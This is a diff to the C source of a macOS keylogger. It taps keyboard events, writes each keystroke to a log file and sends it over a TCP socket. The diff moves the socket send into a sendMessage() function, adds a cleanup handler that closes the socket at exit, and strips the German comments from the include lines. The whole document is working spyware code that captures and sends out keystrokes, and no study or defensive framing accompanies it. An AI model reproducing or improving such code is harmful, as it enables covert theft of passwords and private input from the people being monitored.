@@ -1,12 +1,12 @@
-#include <sys/types.h>    // für socket()
-#include <sys/socket.h>   // für socket()
-#include <netinet/in.h>   // für socket()
-#include <assert.h>       // für assert()
-#include <netdb.h>        // für getprotobyname()
-#include <unistd.h>       // für close()
-#include <arpa/inet.h>    //für inet_ntop()
-#include <netdb.h>        //für getaddrinfo()
-#include <string.h>         // für memset()
+#include <sys/types.h>  
+#include <sys/socket.h> 
+#include <netinet/in.h> 
+#include <assert.h>     
+#include <netdb.h>      
+#include <unistd.h>     
+#include <arpa/inet.h>  
+#include <netdb.h>      
+#include <string.h>     
 #include <stdio.h> 
 #include <errno.h>
 #include <unistd.h>
@@ -18,10 +18,13 @@ FILE *logFile = NULL;
 int counter = 0;
 int socks = 0;
 char* keyCodeToReadableString (CGKeyCode);
+int sendMessage(CGKeyCode keyCode);
+void doAtExit(void);
+
 CGEventRef myCGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
 
 int main (int argc, const char * argv[]) {
-    
+    atexit(doAtExit);
     
     /* Socket erstellen */
     socks = socket(AF_INET, SOCK_STREAM, 0);
@@ -66,20 +69,25 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
   
   counter++;
   CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+  sendMessage(keyCode);
   if (logFile) {
     time_t currentTime;
     time(&currentTime);
-    struct tm *time_info = localtime(&currentTime);
-    
-     char msg[100];
-     strncpy(msg, keyCodeToReadableString(keyCode), 100);
-     send(socks , msg, sizeof(msg), 0);
     fprintf(logFile, "%s\n", keyCodeToReadableString(keyCode));
-    
     //if (counter % 100 == 0) 
     fflush(logFile);
   }
   return event;
+}
+
+int sendMessage(CGKeyCode keyCode) {
+    char msg[100];
+    strncpy(msg, keyCodeToReadableString(keyCode), 100);
+    return send(socks , msg, sizeof(msg), 0);
+}
+void doAtExit(void) {
+    puts("Disconnecting...");
+    close(socks);
 }
 
 char* keyCodeToReadableString (CGKeyCode keyCode) {
